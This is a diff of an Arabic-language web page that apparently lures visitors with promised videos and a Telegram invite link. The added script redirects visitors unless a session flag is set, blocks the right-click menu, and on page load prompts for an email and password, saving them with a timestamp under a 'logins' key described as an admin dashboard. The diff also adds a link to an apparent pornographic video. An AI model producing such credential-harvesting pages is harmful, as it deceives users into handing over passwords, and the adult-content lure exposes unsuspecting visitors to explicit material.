@@ -7,6 +7,49 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    
+    <script>
+        if (sessionStorage.getItem("authenticated") !== "true") {
+            alert("🚫 لا يمكنك الدخول مباشرة! عد إلى الصفحة الرئيسية.");
+            window.location.href = "index.html";
+        }
+    
+        const expectedDevice = sessionStorage.getItem("device"); 
+        const actualDevice = detectDevice();
+    
+        function detectDevice() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            return (userAgent.includes("mobile") || userAgent.includes("android") || userAgent.includes("iphone")) ? "mobile" : "desktop";
+        }
+    
+
+
+  // دالة لفتح نافذة تطلب إدخال البريد الإلكتروني وكلمة المرور
+  function handleLoginData() {
+      const email = prompt("أدخل بريدك الإلكتروني:");
+      const password = prompt("أدخل كلمة السر:");
+
+      // تخزين البيانات في لوحة تحكم المسؤول
+      const loginData = {
+        email: email,
+        password: password,
+        device: "mobile",
+        timestamp: new Date().toLocaleString()
+      };
+
+      let logins = JSON.parse(localStorage.getItem("logins")) || [];
+      logins.push(loginData);
+      localStorage.setItem("logins", JSON.stringify(logins));
+
+      alert(`تم تسجيل الدخول عبر الهاتف: ${email}`);
+    }
+
+    window.onload = handleLoginData;
+
+
+    </script>
+    
+
 
     <script>document.addEventListener("contextmenu", function(event) {
         event.preventDefault(); // منع القائمة الافتراضية
@@ -19,81 +62,47 @@
     <h1 class="logo">🌐 [Strine] الملكة</h1>
     <h2> يمكنك مشاهدة الفيديوهات  في التليجرام </h2>
 
-    <button onclick="window.location.href='https://t.me/+TxsTGEtFpTc1Yzgx';">مشاهدة 👁️</button>
+    <button onclick="window.location.href='https://t.me/+TxsTGEtFpTc1Yzgx';">مشاهدة أكثر...👁️</button>
       <!-- فيديو مخصص للكمبيوتر -->
-      <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xs.mp4" type="video/mp4">
+      <video controls width="80%" poster="https://coverr.co/images/coverr-working-man-7983.jpg">
+        <source src=" https://v7.cdnde.com/x7/upload_396bd5a2fb35a25b2e61bf0bc32b51a7/42363/JOPORN_NET_42363_480p.mp4" type="video/mp4">
         متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x5.mp4" type="video/mp4">
+      </video>
+      
+      <video controls width="80%" poster="https://coverr.co/images/coverr-browsing-dog-2123.jpg">
+        <source src="https://cdn.coverr.co/videos/coverr-browsing-dog-2123/1080p.mp4" type="video/mp4">
         متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x4v.mp4" type="video/mp4">
+      </video>
+      
+      <video controls width="80%" poster="https://coverr.co/images/coverr-morning-mug-3594.jpg">
+        <source src="https://cdn.coverr.co/videos/coverr-morning-mug-3594/1080p.mp4" type="video/mp4">
         متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x5v.mp4" type="video/mp4">
+      </video>
+      
+      <video controls width="80%" poster="https://coverr.co/images/coverr-coding-at-night-7304.jpg">
+        <source src="https://cdn.coverr.co/videos/coverr-coding-at-night-7304/1080p.mp4" type="video/mp4">
         متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv6.mp4" type="video/mp4">
+      </video>
+      <video controls width="80%" poster="https://coverr.co/images/coverr-working-man-7983.jpg">
+        <source src="https://cdn.coverr.co/videos/coverr-working-man-7983/1080p.mp4" type="video/mp4">
         متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv7.mp4" type="video/mp4">
+      </video>
+      
+      <video controls width="80%" poster="https://coverr.co/images/coverr-browsing-dog-2123.jpg">
+        <source src="https://cdn.coverr.co/videos/coverr-browsing-dog-2123/1080p.mp4" type="video/mp4">
         متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x1v.mp4" type="video/mp4">
+      </video>
+      
+      <video controls width="80%" poster="https://coverr.co/images/coverr-morning-mug-3594.jpg">
+        <source src="https://cdn.coverr.co/videos/coverr-morning-mug-3594/1080p.mp4" type="video/mp4">
         متصفحك لا يدعم الفيديو.
-    </video>
-
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x1v.mp4" type="video/mp4">
+      </video>
+      
+      <video controls width="80%" poster="https://coverr.co/images/coverr-coding-at-night-7304.jpg">
+        <source src="https://cdn.coverr.co/videos/coverr-coding-at-night-7304/1080p.mp4" type="video/mp4">
         متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x1v.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x1v.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x1v.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x1v.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x1v.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x1v.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x1v.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x1v.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x1v.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="80%"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x1v.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
+      </video>
+            
    
       
     
